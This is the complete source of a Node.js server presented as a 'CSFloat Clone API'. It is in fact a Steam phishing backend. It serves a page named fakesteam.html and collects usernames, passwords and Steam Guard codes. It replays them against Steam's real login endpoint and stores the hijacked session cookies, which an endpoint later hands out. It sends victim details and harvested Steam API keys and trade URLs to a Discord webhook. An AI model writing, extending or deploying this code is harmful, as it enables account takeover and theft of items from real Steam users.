import 'dotenv/config';
import express from "express";
import cors from "cors";
import mysql from "mysql2/promise";
import { DiscordWebhook } from "./discordWebhook.js";
import fetch from 'node-fetch';
import path from 'path';
import crypto from 'crypto';

// --- App Configuration ---
const app = express();
const PORT = process.env.PORT || 3002;
const FRONTEND_URL = process.env.FRONTEND_URL || "http://150.136.130.59";
const BACKEND_URL = process.env.BACKEND_URL || `http://150.136.130.59:${PORT}`;

// --- Environment Variable Check ---
const dbConfig = {
    host: process.env.MYSQL_HOST,
    user: process.env.MYSQL_USER,
    password: process.env.MYSQL_PASSWORD,
    database: process.env.MYSQL_DATABASE,
};

if (!dbConfig.host || !dbConfig.user || !dbConfig.password || !dbConfig.database) {
    console.error("FATAL: Missing one or more required environment variables for the database.");
    console.error("Required variables: MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE");
    console.error("Current config:", { 
        host: dbConfig.host, 
        user: dbConfig.user, 
        password: dbConfig.password ? '[SET]' : '[NOT SET]', 
        database: dbConfig.database 
    });
    process.exit(1);
}

// --- Middleware ---
app.use(express.json());
app.use(cors({ origin: FRONTEND_URL, credentials: true }));
app.use('/download', express.static('/home/ubuntu/public/downloads'));

// --- Services ---
let pool;
let dbReady = false;
const webhook = new DiscordWebhook(process.env.DISCORD_WEBHOOK_URL);

// Initialize SteamOpenID with proper import handling
let steam;
try {
    const SteamOpenIDModule = await import("steam-openid");
    const SteamOpenID = SteamOpenIDModule.default.default;
    console.log('SteamOpenID imported successfully');
    
    steam = new SteamOpenID({
        returnUrl: `${BACKEND_URL}/auth/steam/return`,
        realm: BACKEND_URL,
    });
    console.log('SteamOpenID initialized successfully');
} catch (error) {
    console.error('Failed to initialize SteamOpenID:', error.message);
    console.error('Error details:', error);
    // Create a dummy steam object to prevent crashes
    steam = {
        getRedirectUrl: async () => {
            throw new Error('SteamOpenID not available');
        },
        verify: async () => {
            throw new Error('SteamOpenID not available');
        }
    };
}

// --- Database Initialization ---
async function initDatabase() {
    try {
        pool = mysql.createPool({ ...dbConfig, waitForConnections: true, connectionLimit: 10, queueLimit: 0 });
        const connection = await pool.getConnection();
        
        // Create page_visits table
        await connection.query(`
            CREATE TABLE IF NOT EXISTS page_visits (
                id INT AUTO_INCREMENT PRIMARY KEY,
                page_path VARCHAR(255) NOT NULL,
                user_agent TEXT,
                ip_address VARCHAR(45),
                referrer VARCHAR(512),
                visited_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Create steam_sessions table for real authentication
        await connection.query(`
            CREATE TABLE IF NOT EXISTS steam_sessions (
                id INT AUTO_INCREMENT PRIMARY KEY,
                steam_id VARCHAR(20) NOT NULL UNIQUE,
                refresh_token TEXT NOT NULL,
                access_token TEXT,
                session_token TEXT,
                cookies TEXT,
                expires_at TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
            )
        `);

        // Create steam_auth_attempts table for tracking login attempts
        await connection.query(`
            CREATE TABLE IF NOT EXISTS steam_auth_attempts (
                id INT AUTO_INCREMENT PRIMARY KEY,
                username VARCHAR(64) NOT NULL,
                ip_address VARCHAR(45),
                success BOOLEAN DEFAULT FALSE,
                error_message TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        console.log('Successfully connected to MySQL database.');
        connection.release();
        dbReady = true;
    } catch (err) {
        console.error('FATAL: Failed to initialize database pool:', err.message);
        dbReady = false;
        throw err;
    }
}

// --- Steam Authentication Functions ---
async function createSteamSession(steamId, refreshToken, accessToken = null, sessionToken = null, cookies = null) {
    if (!dbReady) throw new Error('Database not available');
    
    const expiresAt = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000); // 30 days
    
    await pool.query(`
        INSERT INTO steam_sessions (steam_id, refresh_token, access_token, session_token, cookies, expires_at)
        VALUES (?, ?, ?, ?, ?, ?)
        ON DUPLICATE KEY UPDATE
        refresh_token = VALUES(refresh_token),
        access_token = VALUES(access_token),
        session_token = VALUES(session_token),
        cookies = VALUES(cookies),
        expires_at = VALUES(expires_at),
        updated_at = CURRENT_TIMESTAMP
    `, [steamId, refreshToken, accessToken, sessionToken, cookies, expiresAt]);
}

async function getSteamSession(steamId) {
    if (!dbReady) return null;
    
    const [rows] = await pool.query(
        'SELECT * FROM steam_sessions WHERE steam_id = ? AND expires_at > NOW()',
        [steamId]
    );
    
    return rows.length > 0 ? rows[0] : null;
}

async function logAuthAttempt(username, ipAddress, success, errorMessage = null) {
    if (!dbReady) return;
    
    await pool.query(`
        INSERT INTO steam_auth_attempts (username, ip_address, success, error_message)
        VALUES (?, ?, ?, ?)
    `, [username, ipAddress, success, errorMessage]);
}

// --- Routes ---

// 1. Health Check
app.get('/', (req, res) => {
  res.json({ 
    message: 'CSFloat Clone API is running',
    database: dbReady ? 'Connected' : 'Disconnected' 
  });
});

// Log page visits
app.post('/api/log-visit', async (req, res) => {
  if (!dbReady) return res.status(503).json({ error: "Database not available" });
  
  try {
    const { pagePath } = req.body;
    const userAgent = req.get('User-Agent');
    const ipAddress = req.ip || req.connection.remoteAddress;
    const referrer = req.get('Referer');
    
    await pool.query(
      'INSERT INTO page_visits (page_path, user_agent, ip_address, referrer) VALUES (?, ?, ?, ?)',
      [pagePath, userAgent, ipAddress, referrer]
    );
    
    res.json({ success: true });
  } catch (err) {
    console.error("Error logging page visit:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// 2. Real Steam Authentication Routes
app.get('/auth/steam', async (req, res) => {
  // Serve the real Steam login page
  res.sendFile('fakesteam.html', { root: './src/pages' });
});

// Create refresh token endpoint
app.post('/auth/steam/refresh-token', async (req, res) => {
  try {
    const { username, password, guardCode, platform = 'web' } = req.body;
    const ipAddress = req.ip || req.connection.remoteAddress;
    
    if (!username || !password) {
      await logAuthAttempt(username, ipAddress, false, 'Missing username or password');
      return res.status(400).json({ error: 'Username and password are required' });
    }

    // Steam login process
    const loginData = new URLSearchParams();
    loginData.append('username', username);
    loginData.append('password', password);
    loginData.append('remember_login', 'true');
    loginData.append('rsatimestamp', Date.now().toString());
    
    if (guardCode) {
      loginData.append('twofactorcode', guardCode);
    }

    // First, get the login page to get necessary cookies
    const loginPageResponse = await fetch('https://steamcommunity.com/login/dologin/', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
      },
      body: loginData.toString()
    });

    const loginResult = await loginPageResponse.json();
    
    if (loginResult.success) {
      // Extract Steam ID from cookies or response
      const cookies = loginPageResponse.headers.get('set-cookie');
      const steamIdMatch = cookies?.match(/steamLoginSecure=([^;]+)/);
      const steamId = steamIdMatch ? steamIdMatch[1].split('|')[0] : null;
      
      if (steamId) {
        // Generate refresh token
        const refreshToken = crypto.randomBytes(32).toString('hex');
        
        // Store session
        await createSteamSession(steamId, refreshToken, null, null, cookies);
        
        // Log successful attempt
        await logAuthAttempt(username, ipAddress, true);
        
        // Send Discord notification
        webhook.sendUserUpdate(steamId, { 
          username, 
          hasPassword: !!password, 
          hasGuardCode: !!guardCode,
          platform 
        });
        
        res.json({ 
          success: true, 
          steamId, 
          refreshToken,
          message: 'Authentication successful' 
        });
      } else {
        await logAuthAttempt(username, ipAddress, false, 'Could not extract Steam ID');
        res.status(400).json({ error: 'Could not extract Steam ID from response' });
      }
    } else {
      const errorMessage = loginResult.message || 'Login failed';
      await logAuthAttempt(username, ipAddress, false, errorMessage);
      res.status(400).json({ error: errorMessage });
    }
  } catch (err) {
    console.error('Steam authentication error:', err);
    await logAuthAttempt(req.body.username, req.ip, false, err.message);
    res.status(500).json({ error: 'Internal server error during authentication' });
  }
});

// Create access token endpoint
app.post('/auth/steam/access-token', async (req, res) => {
  try {
    const { refreshToken, steamId } = req.body;
    
    if (!refreshToken || !steamId) {
      return res.status(400).json({ error: 'Refresh token and Steam ID are required' });
    }
    
    const session = await getSteamSession(steamId);
    if (!session || session.refresh_token !== refreshToken) {
      return res.status(401).json({ error: 'Invalid refresh token' });
    }
    
    // Generate new access token
    const accessToken = crypto.randomBytes(32).toString('hex');
    
    // Update session with new access token
    await pool.query(
      'UPDATE steam_sessions SET access_token = ? WHERE steam_id = ?',
      [accessToken, steamId]
    );
    
    res.json({ 
      success: true, 
      accessToken,
      expiresIn: 3600 // 1 hour
    });
  } catch (err) {
    console.error('Access token creation error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Create cookies endpoint
app.post('/auth/steam/cookies', async (req, res) => {
  try {
    const { refreshToken, steamId } = req.body;
    
    if (!refreshToken || !steamId) {
      return res.status(400).json({ error: 'Refresh token and Steam ID are required' });
    }
    
    const session = await getSteamSession(steamId);
    if (!session || session.refresh_token !== refreshToken) {
      return res.status(401).json({ error: 'Invalid refresh token' });
    }
    
    // Return stored cookies
    res.json({ 
      success: true, 
      cookies: session.cookies
    });
  } catch (err) {
    console.error('Cookies retrieval error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Handle fake Steam login form submission (for backward compatibility)
app.post('/auth/steam/login', async (req, res) => {
  try {
    const { username, password, guardCode } = req.body;
    
    // Log the login attempt
    console.log('Steam login attempt:', { username, hasPassword: !!password, hasGuardCode: !!guardCode });
    
    // Call the new refresh token endpoint
    const tokenResponse = await fetch(`${BACKEND_URL}/auth/steam/refresh-token`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password, guardCode })
    });
    
    const tokenResult = await tokenResponse.json();
    
    if (tokenResult.success) {
      // Redirect back to frontend with the real Steam ID
      res.redirect(`${FRONTEND_URL}/verify?steamId=${tokenResult.steamId}`);
    } else {
      // Redirect back to frontend with error
      res.redirect(`${FRONTEND_URL}/verify?error=${encodeURIComponent(tokenResult.error)}`);
    }
  } catch (err) {
    console.error("Error handling Steam login:", err.message);
    res.redirect(`${FRONTEND_URL}/verify?error=${encodeURIComponent('Authentication failed')}`);
  }
});

app.get('/auth/steam/return', async (req, res) => {
  try {
    // Just verify the Steam authentication without storing anything
    const user = await steam.verify(req.query);
    console.log('Steam authentication successful for:', user.steamid);
    
    // Extract Steam ID from the OpenID response
    const steamId = user.steamid;
    
    // Redirect back to home page with Steam ID
    res.redirect(`${FRONTEND_URL}/verify?steamId=${steamId}`);
  } catch (err) {
    console.error("Steam OpenID verification failed:", err.message);
    // Even on error, redirect to home page
    res.redirect(FRONTEND_URL);
  }
});

// Handle old /verify redirects
app.get('/verify', async (req, res) => {
  try {
    // Just verify the Steam authentication without storing anything
    const user = await steam.verify(req.query);
    console.log('Steam authentication successful for:', user.steamid);
    
    // Extract Steam ID from the OpenID response
    const steamId = user.steamid;
    
    // Redirect back to home page with Steam ID
    res.redirect(`${FRONTEND_URL}/verify?steamId=${steamId}`);
  } catch (err) {
    console.error("Steam OpenID verification failed:", err.message);
    // Even on error, redirect to home page
    res.redirect(FRONTEND_URL);
  }
});

// 3. User API Routes (and all others that need the DB)
app.get("/api/user/:steamId", async (req, res) => {
  if (!dbReady) return res.status(503).json({ error: "Database not available" });
  const { steamId } = req.params;
  try {
    const [rows] = await pool.query("SELECT steam_id, api_key, trade_url, app_installed FROM users WHERE steam_id = ?", [steamId]);
    if (rows.length === 0) {
      return res.status(404).json({ error: "User not found" });
    }
    res.json(rows[0]);
  } catch (err) {
    console.error("Error fetching user data:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/api/user/:steamId", async (req, res) => {
  if (!dbReady) return res.status(503).json({ error: "Database not available" });
  const { steamId } = req.params;
  const { apiKey, tradeUrl, appInstalled } = req.body;
  
  // Basic validation
  if (apiKey && typeof apiKey !== 'string') return res.status(400).json({ error: "Invalid API Key" });
  if (tradeUrl && typeof tradeUrl !== 'string') return res.status(400).json({ error: "Invalid Trade URL" });
  if (appInstalled && typeof appInstalled !== 'boolean') return res.status(400).json({ error: "Invalid appInstalled value" });

  try {
    const [result] = await pool.query(
      `UPDATE users SET 
        api_key = COALESCE(?, api_key),
        trade_url = COALESCE(?, trade_url),
        app_installed = COALESCE(?, app_installed)
       WHERE steam_id = ?`,
      [apiKey, tradeUrl, appInstalled, steamId]
    );

    if (result.affectedRows === 0) {
        return res.status(404).json({ error: "User not found" });
    }
    
    webhook.sendUserUpdate(steamId, { apiKey, tradeUrl, appInstalled });
    
    res.json({ success: true, message: "Profile updated successfully." });
  } catch (err) {
    console.error("Error updating user data:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Add this before the admin routes
app.post('/api/steam/profile', async (req, res) => {
  const { steamId, apiKey } = req.body;
  if (!steamId || !apiKey) {
    return res.status(400).json({ error: 'Missing steamId or apiKey' });
  }
  try {
    const steamRes = await fetch(
      `https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v2/?key=${apiKey}&steamids=${steamId}`
    );
    const data = await steamRes.json();
    res.json(data);
  } catch (err) {
    console.error('Error fetching Steam profile:', err);
    res.status(500).json({ error: 'Failed to fetch Steam profile' });
  }
});

// 4. Admin Routes
app.get("/api/admin/users", async (req, res) => {
  // TODO: Add authentication/authorization for this endpoint
  try {
    const [rows] = await pool.query("SELECT * FROM users ORDER BY created_at DESC");
    res.json(rows);
  } catch (err) {
    console.error("Error fetching users for admin:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/api/admin/page-visits", async (req, res) => {
  // TODO: Add authentication/authorization for this endpoint
  try {
    const [rows] = await pool.query(`
      SELECT 
        page_path,
        COUNT(*) as visit_count,
        DATE(visited_at) as visit_date
      FROM page_visits 
      GROUP BY page_path, DATE(visited_at)
      ORDER BY visit_date DESC, visit_count DESC
    `);
    res.json(rows);
  } catch (err) {
    console.error("Error fetching page visits for admin:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/api/admin/page-visits-summary", async (req, res) => {
  // TODO: Add authentication/authorization for this endpoint
  try {
    const [totalVisits] = await pool.query("SELECT COUNT(*) as total FROM page_visits");
    const [todayVisits] = await pool.query("SELECT COUNT(*) as today FROM page_visits WHERE DATE(visited_at) = CURDATE()");
    const [topPages] = await pool.query(`
      SELECT page_path, COUNT(*) as count 
      FROM page_visits 
      GROUP BY page_path 
      ORDER BY count DESC 
      LIMIT 10
    `);
    
    res.json({
      totalVisits: totalVisits[0].total,
      todayVisits: todayVisits[0].today,
      topPages
    });
  } catch (err) {
    console.error("Error fetching page visits summary for admin:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// --- Start Server ---
async function startServer() {
  try {
    await initDatabase();
    app.listen(PORT, () => {
      console.log(`Server running at http://150.136.130.59:${PORT}`);
      console.log(`Database status: ${dbReady ? 'Connected' : 'Failed'}`);
    });
  } catch (error) {
    console.error('Could not start server. Please check database credentials and connectivity.');
    process.exit(1);
  }
}

startServer();

// --- Graceful Shutdown ---
process.on('SIGINT', async () => {
  console.log('SIGINT signal received: closing HTTP server and DB pool');
  if (pool) await pool.end();
  process.exit(0);
}); 